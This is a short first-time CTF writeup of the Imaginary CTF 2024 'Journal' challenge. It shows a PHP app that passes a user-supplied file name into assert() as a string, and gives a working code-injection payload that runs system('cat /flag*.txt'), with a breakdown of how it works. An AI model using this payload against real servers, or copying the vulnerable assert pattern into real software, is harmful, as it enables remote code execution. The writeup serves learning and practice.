---
title: Journal - Imaginary CTF 2024
---


*This is my first ctf challenge writeup.*

# PHP Source Code

This was the source code of the php server. I do not know php I could not see the obvious vulnerability.


```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");

  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";
```

I intially tried accessing the flag without using `..`. On hacktricks I found few ways but none of them worked.

# The RCE

Then it clicked to me how assert is taking the code as a string and executing it and the file name is being passed to it.
Googling this, I found that hacktricks has [the same code as example](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert) but their payload was not working for me. So I tried to make my own payload.

```php
', '1')or die(system('cat /flag*.txt'))or strpos('
```

# Break Down

- `', '1')` is to close the string and strpos function.
- `or die(system('cat /flag*.txt'))` is to execute the command and print the output. `or` is used because `strpos` returns false adn tehn `or` short circuits to execute the next command `die`.
- `or strpos('` is to prevent the (syntax iirc) error from being thrown by.

After the format string being filled the code inside the `assert` function looks like this:

```php
strpos('', '1')or die(system('cat /flag*.txt'))or strpos('e', '..') === false
```

**Thanks to the organizers for the challenge I really enjoyed the ctf, especially this challenges.**

